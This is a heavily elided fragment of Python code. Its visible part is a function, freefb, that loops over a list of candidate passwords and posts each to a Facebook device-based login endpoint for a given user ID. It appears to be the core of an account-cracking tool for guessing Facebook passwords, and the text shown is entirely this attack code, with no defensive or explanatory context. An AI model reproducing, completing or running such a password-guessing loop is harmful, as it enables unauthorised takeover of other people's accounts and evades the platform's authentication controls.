...
def freefb(uid, name, pwx, tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            lo = Session.post("https://web.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
